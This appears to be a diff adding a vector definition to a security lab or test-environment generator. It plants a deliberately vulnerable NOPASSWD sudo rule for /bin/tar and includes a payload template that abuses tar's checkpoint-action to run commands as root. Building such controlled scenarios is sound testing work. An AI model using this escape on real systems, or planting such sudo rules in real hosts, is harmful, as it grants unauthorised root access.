@@ -1,0 +1,45 @@
+# T1548.003 — Sudo and Sudo Caching.
+# A NOPASSWD sudo rule for a binary with a documented GTFOBins shell escape.
+# Parameterised by {binary}; the derivation rule (scope.yaml rules.sudo) only
+# emits a vector when the binary is on the shell-escape list, so a NOPASSWD rule
+# for /bin/ls is examined and declined (negative control).
+id: nopasswd_sudo
+title: "NOPASSWD sudo rule with a shell-escape binary"
+technique: T1548.003
+executable_in: either
+summary: >-
+  {user} may run {binary} as root with no password. {binary} has a documented
+  shell escape, so the rule is equivalent to a root shell.
+
+needs: [account]
+
+# params the blueprint may set: binary (default /bin/tar), escape payload.
+params:
+  binary: "/bin/tar"
+  payload_template: "sudo -n /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat {canary}'"
+
+seed: |
+  cat > /etc/sudoers.d/{user} <<'SUDOERS'
+  {user} ALL=(root) NOPASSWD: {binary}
+  SUDOERS
+  chmod 0440 /etc/sudoers.d/{user}
+  visudo -cf /etc/sudoers.d/{user}
+
+realism: |
+  install -d -m 755 -o {user} -g {user} /opt/app
+  cat > /opt/app/reload.sh <<'RELOAD'
+  #!/bin/sh
+  # Rotate build artefacts. Needs root to write /var/backups, hence the sudo rule.
+  sudo {binary} -czf /var/backups/app-$(date +%F).tgz /opt/app
+  RELOAD
+  chmod 755 /opt/app/reload.sh
+  chown {user}:{user} /opt/app/reload.sh
+
+verify:
+  adapter: config_abuse
+  check: sudo_rule
+  scope: local
+  start_user: "{user}"
+  params:
+    sudo_target: "{binary}"
+    payload_template: "{payload_template}"
